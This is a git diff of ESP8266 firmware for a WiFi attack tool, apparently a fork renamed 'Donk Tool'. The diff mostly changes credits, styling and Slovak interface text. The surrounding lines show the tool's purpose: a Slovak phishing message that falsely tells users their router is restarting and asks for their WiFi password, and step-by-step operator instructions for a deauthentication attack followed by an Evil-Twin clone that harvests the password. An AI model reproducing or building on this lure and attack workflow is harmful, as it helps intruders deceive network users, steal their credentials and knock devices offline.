@@ -1,3 +1,9 @@
+
+
+// EDITED by Fattcat
+// GitHub : github.com/Fattcat
+
+
 #include <ESP8266WiFi.h>
 #include <DNSServer.h>
 #include <ESP8266WebServer.h>
@@ -7,11 +13,6 @@
 #define BODY "Nastali neočakávané problémy ! Router bude reštartovaný . Napíšte heslo od vašej wifi siete pre pripojenie k internetu."
 #define POST_TITLE "Prihlasovanie..."
 #define POST_BODY "Overovanie ... Prosím, počkajte na overenie. Môže to trvať až 1 minútu.</br>Ďakujeme za používanie našeho firmvéru. Ak sa táto web stránka vypne, alebo bude čierna, tak následne skontrolujte vaše internetové pripojenie na sieti."
-
-
-// EDITED by Fattcat
-// GitHub : github.com/Fattcat
-
 
 typedef struct
 {
@@ -68,8 +69,8 @@ String header(String t)
       }
       button {
         display: inline-block;
-        height: 60px;
-        padding: 0 30px;
+        height: 120px;
+        padding: 0 60px;
         
 
         color: purple;
@@ -295,24 +296,29 @@ void handleIndex()
       <meta charset="UTF-8">
       <div class='content'>
         <p>
-          <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">ZiFi</h1>
+          <h1 style="border: solid #20c20e 3px; padding: 0.2em 0.2em; text-align: center; font-size: 2.5rem;">Donk Tool</h1>
           <span style="color: #F04747;">INFO: </span><br>
           <span>
-              - Toto zariadenie bide skenovať siete v okolí automaticky každých 15 sekúnd. (Alebo môžete REFRESHNÚŤ túto Web Stránku).<br>
+              - Toto zariadenie bude skenovať siete v okolí automaticky každých 15 sekúnd. (Alebo môžete REFRESHNÚŤ túto Web Stránku).<br>
               - <strong style="color: #008000;">Prosím vyberte LEN JEDNU CIELOVÚ SIEŤ!</strong><br>
               - Ďalej klikni na tlačidlo "deauth attack", Potom po nejakom čase sa NASILU ODPOJÍ pripojené zariadenia (klienti) na tej cieľovej wifi sieti.<BR>
               - Teraz spustite "Evil-Twin attack", <strong style="color: #008000;">ktorý vytvorí KLON vybranej siete</strong>.<br>
-              - The web interface will be unavailable during Evil-twin attack mode, You need to reconnect.<br>
+              - <strong style="color: red;">Web stránka bude nedostupná kvôli Evil-twin attack módu.</strong> Musíš sa pripojiť po nejako mčase (1 - 2 min).<br>
               - POTOM SA PRIPOJ PO NEJAKOM ČASE !, zobrazí sa DOLE NA SPODU Web stránky správne heslo od vybranej siete v "Result section".<br><br>
-              SPECIAL CREDITS / VEĽKÁ VĎAKA: <strong style="color: #008000;">Dominik Hulin</strong>, Spacehuhn, M1z23R, 125K
+              SPECIAL CREDITS / VEĽKÁ VĎAKA: <strong style="color: #008000;">Dominik Hulin (GitHub: github.com/Fattcat)</strong>,<br> Spacehuhn,<br> M1z23R,<br>a aj 125K<br>
           </span>
         </p><br><hr><br>
-        <h1>Attack Mode</h1>
+
+
+        <h1 style="color: orange;">Attack Mode</h1>
         <div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>
-        <button style='display:inline-block;'{disabled}>{deauth_button}</button></form>
+        <button style='display:inline-block; background-color: red; color: white; width: 230px; height: 170px; font-size: 50px;'{disabled}>{deauth_button}</button></form>
         <form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>
-        <button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>
+        <button style='display:inline-block; background-color: red; color: white; width: 230px; height: 170px; font-size: 50px;'{disabled}>{hotspot_button}</button></form>
         </div><br><hr><br>
+
+
+        
         <h1>Attack Panel</h1>
         <table>
             <tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>
@@ -454,4 +460,3 @@ void loop()
     Serial.println(WiFi.localIP());
   }
 }
-
